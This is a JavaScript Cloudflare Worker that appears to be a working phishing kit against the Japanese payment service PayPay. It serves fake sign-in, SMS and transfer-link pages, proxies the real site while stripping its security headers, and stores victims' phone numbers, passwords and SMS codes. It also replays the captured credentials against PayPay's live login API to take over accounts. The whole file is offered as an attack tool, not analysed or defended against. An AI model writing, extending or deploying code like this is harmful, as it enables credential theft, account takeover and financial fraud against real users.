// Cloudflare Worker — reverse proxy to PayPay + credential store + API login
// KV binding: CREDS
// / → /admin リダイレクト
// /admin で管理画面
// 16文字IDパスは docs/link.html（送金リンクページ）を配信
// /signin.html でログイン画面
// /api/login で credential を KV に保存し、PayPay API ログインを試みる

const TARGET_ORIGIN = "https://www.paypay.ne.jp";
const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
const ADMIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/admin.html";
const LINK_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/link.html";
const SIGNIN_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signin.html";
const SMS_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/sms.html";
const SIGNUP_SOURCE = "https://raw.githubusercontent.com/mnaoki20081106-afk/paypay-/main/docs/signup.html";

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    if (url.pathname === "/" || url.pathname === "") {
      return Response.redirect(url.origin + "/admin", 302);
    }

    if (url.pathname === "/admin" || url.pathname === "/admin.html") {
      return fetchStatic(ADMIN_SOURCE);
    }

    if (url.pathname === "/link.html" || url.pathname === "/link") {
      return fetchStatic(LINK_SOURCE);
    }

    if (url.pathname === "/signin.html" || url.pathname === "/signin") {
      return fetchStatic(SIGNIN_SOURCE);
    }

    if (url.pathname === "/signup.html" || url.pathname === "/signup") {
      return fetchStatic(SIGNUP_SOURCE);
    }

    if (url.pathname === "/sms.html" || url.pathname === "/sms") {
      return fetchStatic(SMS_SOURCE);
    }

    if (url.pathname === "/api/login" && request.method === "POST") {
      return handleLogin(request, env);
    }

    if (url.pathname === "/api/sms_confirm" && request.method === "POST") {
      return handleSmsConfirm(request, env);
    }

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    const pathParts = url.pathname.split("/").filter(Boolean);
    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
      return fetchStatic(LINK_SOURCE);
    }

    return proxy(request, env, workerHost);
  },
};

async function handleLogin(request, env) {
  let body = {};
  try { body = await request.json(); } catch {}
  const phone = body.phone || body.username || "";
  const password = body.password || "";

  if (!phone || !password) {
    return json({ error: "phone and password required" }, 400);
  }

  const captured = {
    type: "login_attempt",
    phone,
    password,
    ts: new Date().toISOString(),
    ua: request.headers.get("User-Agent") || "",
  };

  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(captured));

  const loginResult = await attemptPayPayLogin(phone, password);
  captured.login_result = loginResult;
  await env.CREDS.put(key, JSON.stringify(captured));

  if (loginResult.success) {
    return json({ status: "sms_required", message: "SMS認証が必要です" });
  } else if (loginResult.waf_blocked) {
    return json({ status: "sms_required", message: "SMS認証が必要です", note: "WAF blocked, credentials saved" });
  } else {
    return json({ error: loginResult.error || "ログインに失敗しました" }, 401);
  }
}

async function attemptPayPayLogin(phone, password) {
  try {
    const headers = {
      "Accept": "application/json",
      "Accept-Language": "ja-JP,ja;q=0.9",
      "Content-Type": "application/json",
      "Origin": "https://www.paypay.ne.jp",
      "Referer": "https://www.paypay.ne.jp/portal/oauth2/sign-in",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; SCV38 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36 jp.pay2.app.android/5.57.0",
      "X-Requested-With": "jp.ne.paypay.android.app",
    };

    const payload = {
      username: phone,
      password: password,
      signInAttemptCount: 1,
    };

    const res = await fetch("https://www.paypay.ne.jp/portal/api/v2/oauth2/sign-in/password", {
      method: "POST",
      headers,
      body: JSON.stringify(payload),
    });

    if (res.status === 202 && res.headers.get("x-amzn-waf-action")) {
      return { success: false, waf_blocked: true, error: "WAF challenge" };
    }

    const data = await res.json();

    if (data.header && data.header.resultCode === "S0000") {
      return { success: true, data };
    } else {
      return { success: false, error: data.header?.resultMessage || "Login failed", data };
    }
  } catch (err) {
    return { success: false, error: err.message };
  }
}

async function handleSmsConfirm(request, env) {
  let body = {};
  try { body = await request.json(); } catch {}
  const code = body.code || "";

  const captured = {
    type: "sms_confirm",
    code,
    ts: new Date().toISOString(),
  };
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(captured));

  return json({ status: "ok" });
}

async function fetchStatic(source) {
  try {
    const res = await fetch(source);
    if (res.ok) {
      return new Response(await res.text(), {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }
  } catch {}
  return new Response("Fetch failed", { status: 502 });
}

async function proxy(request, env, workerHost) {
  const url = new URL(request.url);
  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? request.body : undefined,
    redirect: "follow",
  });

  const newHeaders = new Headers(res.headers);
  newHeaders.delete("content-security-policy");
  newHeaders.delete("x-frame-options");

  const contentType = newHeaders.get("content-type") || "";
  if (contentType.includes("text/html")) {
    let html = await res.text();
    html = html.replace(/https?:\/\/www\.paypay\.ne\.jp/g, `https://${workerHost}`);
    return new Response(html, { status: res.status, headers: newHeaders });
  }

  return new Response(res.body, { status: res.status, headers: newHeaders });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
